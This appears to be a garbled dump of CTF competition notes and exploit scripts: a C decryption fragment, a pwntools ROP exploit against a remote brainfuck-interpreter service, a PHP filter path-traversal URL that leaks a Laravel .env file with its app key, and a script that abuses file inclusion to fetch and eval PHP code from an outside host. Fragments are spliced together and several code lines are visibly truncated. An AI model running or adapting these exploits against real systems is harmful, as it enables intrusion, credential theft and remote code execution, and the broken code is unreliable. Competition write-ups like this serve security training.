    {
        // printf("steg %d:%p %p\n",i,t1,t2);
        t2 = ror(t2 ^ t1,3);
        t1 = ror((t1 ^ s1t[31-i]) - t2,64-8);
        // t1 = (t1 >> 8) + (t1 > 0x3d) + t2 * 8 ^ t1;
        i = i + 1;
    }
    block res;
    res.a = t2;
    res.b = t1;
    return res;
}
unsigned char encflag[] = 
{0x2a,0x0,0xf8,0x2b,0xe1,0x1d,0x77,0xc1,0xc3,0xb1,0x71,0xfc,0x23,0xd5,0x91,0xf4
,0x30,0xf1,0x1e,0x8b,0xc2,0x88,0x59,0x57,0xd5,0x94,0xab,0x77,0x42,0x2f,0xeb,0x7
5,0xe1,0x5d,0x76,0xf0,0x46,0x6e,0x98,0xb9,0xb6,0x51,0xfd,0xb5,0x5d,0x77,0x36,0x
f2,0xa};
unsigned char testenc[] = 
{0x1,0x14,0x92,0xdd,0xed,0x6d,0xf9,0xcb,0xb1,0xb6,0x8a,0xbb,0x2,0xa,0x99,0x51,0
x3d,0xc3,0x3a,0x41,0x40,0x11,0x9f,0x5c,0x70,0x26,0x6f,0x76,0x95,0x66,0xfb,0xd2}
;
int isp(unsigned char* d)
{
    for(int i=0;i=0x7f)
        {
            return 0;
        }
    }
    return 1;
}
unsigned long long tol(unsigned char *s)
{
    unsigned long long res = 0;
    for(int i=0;iopcode
off-by-one bf
stringbyte 
orw
    return 0;
}
from pwn import *
elf = ELF("./bf",checksec=False)
libc = ELF("./libc.so.6",checksec=False)
def csu(rdi,rsi,rdx,func):
    payload = p64(0x49DC+pie)
    payload += p64(func)+p64(rdi)+p64(rsi)+p64(rdx)+p64(0x49C0+pie)
    payload += 'A'*(8*7)
    return payload
while True:
    try:
        # s = process("./bf")
        s = remote("124.156.135.103","6002")
        payload = '+[>,]>.,'
        payload = payload.rjust(0xf,'1')
        s.sendline(payload)
        for i in range(0x400-2):
            s.send("1")
        s.send('\x00')
        s.send('\xf8')
        s.recvuntil("done! your code: ")
        s.recv(8)
        pie = u64(s.recv(6)+'\x00\x00')-0x4980
        success(hex(pie))
        raw_input(">")
        puts_plt = elf.plt['puts']+pie
Best_php
http://124.156.129.96:8081/file?file=php://filter/read=convert.base64-encode/resource=../.env
        puts_got = elf.got['puts']+pie
        read_plt = elf.plt['read']+pie
        read_got = elf.got['read']+pie
        pop_rdi = 0x00000000000049e3+pie
        pop_rsi_r15 = 0x00000000000049e1+pie
        bss = pie+0x207500
        pop_rsp_rbp = 0x000000000000288d+pie
        payload = 'y'+p64(0)+p64(1)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
        payload += csu(0,bss,0x1000,read_got)
        payload += p64(pop_rsp_rbp)+p64(bss)
        payload += '+[>,]>.,'
        raw_input(">")
        s.sendlineafter('want to continue?',payload)
        for i in range(0x400-2):
            s.send("1")
        s.send('\x00')
        s.send('\xd0')
        s.recvuntil("want to continue?\n")
        s.send("n")
        puts = s.recv(6)+'\x00\x00'
        puts = u64(puts)
        offset = puts-libc.sym['puts']
        success(hex(offset))
        system = offset+libc.sym['system']
        open_ = offset+libc.sym['open']
        write = offset+libc.sym['write']
        read = offset+libc.sym['read']
        pop_rdx = offset+0x0000000000001b96
        sh = bss+0x300
        payload = 
'A'*8+p64(pop_rdi)+p64(sh)+p64(pop_rsi_r15)+p64(0)+p64(0)+p64(open_)
        payload += 
p64(pop_rdi)+p64(3)+p64(pop_rsi_r15)+p64(bss+0x400)+p64(0)+p64(pop_rdx)+p64(0x1
00)+p64(read)
        payload += p64(pop_rdi)+p64(bss+0x400)+p64(puts_plt)
        payload = payload.ljust(0x300,'\x00')
        payload += './flag\x00'
        raw_input(">")
        s.send(payload)
        s.interactive()
    except:
        pass
APP_NAME=Laravel
http://124.156.129.96:8081/file?file=/var/www/ctf-challenge/database/db.sqlite
http://124.156.129.96:8081/file?file=php://filter/read=convert.base64-encode/resource=/var/www
/ctf-challenge/php-my_ext-so-is-here-go-for-it/my_ext.so
pwn
payload libc 2.27
zif_ttt_showphpleak
APP_ENV=local
APP_KEY=base64:4dAiqrhXpwJnbKOG+Ql/P7i0v0oRmPgiTSPXKWyxem0=
APP_DEBUG=false
APP_URL=http://localhost
LOG_CHANNEL=stack
DB_CONNECTION=sqlite
DB_DATABASE=/var/www/ctf-challenge/database/db.sqlite
DB_FOREIGN_KEYS=true
BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=database
SESSION_LIFETIME=120
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379
MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1
MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
strcpyoff-by-null0
off-by-null
getshell
from pwn import *
import requests
import uuid
from urllib import quote
s = requests.Session()
def register():
    tmpstr = uuid.uuid1().__str__()
    name = ""+tmpstr
    email = tmpstr+"@qq.com"
    burp0_url = "http://124.156.129.96:8084/register"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 
10.15; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": 
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-
Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                     "Accept-Encoding": "gzip, deflate", "Referer": "
", "Content-Type": "application/x-www-
form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"name": name, "email": email,
                  "password": "123456789", "password_confirmation": 
"123456789"}
    s.post(burp0_url, headers=burp0_headers, data=burp0_data)
def login():
    burp0_url = "http://124.156.129.96:8084/login"
    burp0_cookies = {"laravel_session": 
"eyJpdiI6IlFiM0wwamNTN0drUkxxZnk0bXB3Umc9PSIsInZhbHVlIjoiV2txaW5FVlliS21vbjNrel
E0UVlNRkVQVkVESWZnUDJVVGE0TG9CQjYzaEhKWGxWOEdmcElGMGxxU1Rqc3RyWSIsIm1hYyI6IjIzM
jc5YWI5MDhhNzM4Y2ViMjliYWQxNzU4Y2E2ODNkMDFmYmMzOGVhOTFkN2IwMWUzMzdjZjA0YjRlODIw
Y2IifQ%3D%3D"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 
10.15; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": 
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-
Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                     "Accept-Encoding": "gzip, deflate", "Referer": "
", "Content-Type": "application/x-www-form-
urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"email": "PI:EMAIL", "password": "PI:EMAIL"}
    s.post(burp0_url, headers=burp0_headers,
           cookies=burp0_cookies, data=burp0_data)
def php_eval(phpcode):
    return s.get("http://124.156.129.96:8084/file?file=%2Fvar%2Fwww%2Fctf-
challenge%2Fdatabase%2Fdb.sqlite&1=$evalc=file_get_contents('http://39.105.216.
123/exp.php');eval($evalc);").text
register()
code = ""
def hint():
    global code
    code += "ttt_hint();"
def backdoor(idx):
    global code
    code += "ttt_backdoor("+str(idx)+");"
def alloc(idx, size):
    global code
    code += "ttt_alloc("+str(idx)+","+str(int(size))+");"
def free(idx):
    global code
    code += "ttt_free("+str(idx)+");"
def edit(idx,content):
    global code
    code += "ttt_edit('"+str(content)+"',"+str(idx)+");"